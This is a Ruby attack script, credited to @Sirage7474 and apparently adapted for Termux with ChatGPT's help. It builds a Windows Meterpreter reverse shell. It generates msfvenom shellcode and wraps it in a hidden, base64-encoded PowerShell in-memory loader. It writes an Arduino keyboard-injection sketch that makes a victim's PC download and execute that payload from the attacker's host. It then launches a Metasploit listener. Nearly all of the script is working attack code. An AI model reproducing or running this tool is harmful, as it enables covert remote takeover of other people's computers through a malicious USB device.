#!/usr/bin/env ruby
# Code aangepast voor Termux door ChatGPT
require 'base64'
require 'readline'

def print_error(text)   = puts "\e[31m[-]\e[0m #{text}"
def print_success(text) = puts "\e[32m[+]\e[0m #{text}"
def print_info(text)    = puts "\e[34m[*]\e[0m #{text}"
def get_input(text)     = print "\e[33m[!]\e[0m #{text}"

def rgets(prompt = '', default = '')
  choice = Readline.readline(prompt, false)
  choice.empty? ? default : choice
end

def select_host
  host_name = rgets('Enter the host IP to listen on: ')
  ip = host_name.split('.')
  if ip.length != 4
    print_error("Not a valid IP\n")
    select_host
  end
  print_success("Using #{host_name} as server\n")
  host_name
end

def select_port
  port = rgets('Choose Port or Leave Blank For [4444]: ')
  port = '4444' if port.strip.empty?
  unless (1..65_535).include?(port.to_i)
    print_error("Not a valid port\n")
    sleep(1)
    return select_port
  end
  print_success("Using #{port}\n")
  port
end

def shellcode_gen(msf_path, host, port)
  print_info("Generating shellcode with msfvenom\n")
  cmd = "#{msf_path}msfvenom -p windows/meterpreter/reverse_tcp LHOST=#{host} LPORT=#{port} -f c"
  output = `#{cmd}`
  shellcode = clean_shellcode(output)
  to_ps_base64(powershell_string(shellcode))
end

def clean_shellcode(sc)
  sc = sc.gsub('\\', ',0').delete('+\" \n')
  sc[0..18] = ''
  sc
end

def to_ps_base64(command)
  Base64.encode64(command.split('').join("\x00") << "\x00").gsub("\n", '')
end

def powershell_string(shellcode)
  s = %($1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr )
  s += 'VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, '
  s += "uint flProtect);[DllImport(\"kernel32.dll\")]public static extern "
  s += 'IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, '
  s += 'IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, '
  s += "IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern "
  s += "IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type "
  s += %(-memberDefinition $c -Name "Win32" -namespace Win32Functions )
  s += "-passthru;[Byte[]];[Byte[]]$sc = #{shellcode};$size = 0x1000;if "
  s += '($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::'
  s += 'VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);'
  s += '$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::'
  s += "CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$gq = "
  s += '[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.'
  s += 'GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + '
  s += %("\\syswow64\\WindowsPowerShell\\v1.0\\powershell";$cmd = "-nop -noni )
  s += %(-enc";iex "& $x86 $cmd $gq"}else{$cmd = "-nop -noni -enc";iex "& )
  s += %(powershell $cmd $gq";})
end

def shell_setup(encoded)
  path = "#{ENV['HOME']}/storage/shared/shell.txt"
  print_info("Writing PowerShell payload to #{path}")
  content = "powershell -nop -window hidden -noni -enc #{encoded}"
  File.write(path, content)
  print_success("Shell saved to shell.txt. Share it via HTTP manually.")
end

def arduino_setup(host)
  print_info("Writing Arduino sketch")
  s = <<~SKETCH
    #include <Keyboard.h>
    void setup() {
      Keyboard.begin();
      delay(1000);
      Keyboard.press(KEY_LEFT_GUI); delay(500);
      Keyboard.press('r'); delay(500);
      Keyboard.releaseAll(); delay(500);
      Keyboard.print("powershell -windowstyle hidden \\\"[system.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true };IEX (New-Object Net.WebClient).DownloadString('http://#{host}/shell.txt')\\\"");
      Keyboard.press(KEY_RETURN); delay(500);
      Keyboard.releaseAll();
      Keyboard.end();
    }
    void loop() {}
  SKETCH
  File.write("reverse_shell_arduino.txt", s)
  print_success("Arduino sketch saved to reverse_shell_arduino.txt")
end

def metasploit_setup(msf_path, host, port)
  rc_file = "msf_listener.rc"
  File.write(rc_file, <<~RC)
    use exploit/multi/handler
    set PAYLOAD windows/meterpreter/reverse_tcp
    set LHOST #{host}
    set LPORT #{port}
    set EnableStageEncoding true
    set ExitOnSession false
    exploit -j
  RC
  system("#{msf_path}msfconsole -r #{rc_file}")
end

# === MAIN ===
begin
  msf_path = if File.exist?("#{ENV['PREFIX']}/bin/msfvenom")
               "#{ENV['PREFIX']}/bin/"
             elsif File.exist?('/opt/metasploit-framework/msfvenom')
               '/opt/metasploit-framework/'
             else
               print_error("Metasploit not found!"); exit
             end

  @set_payload = 'windows/meterpreter/reverse_tcp'
  host = select_host
  port = select_port
  encoded = shellcode_gen(msf_path, host, port)
  shell_setup(encoded)
  arduino_setup(host)

  if rgets('Start listener? [yes/no]: ') == 'yes'
    metasploit_setup(msf_path, host, port)
  end

  print_info("Reverse-Shell-Arduino completed by @Sirage7474 — Termux edition.")
end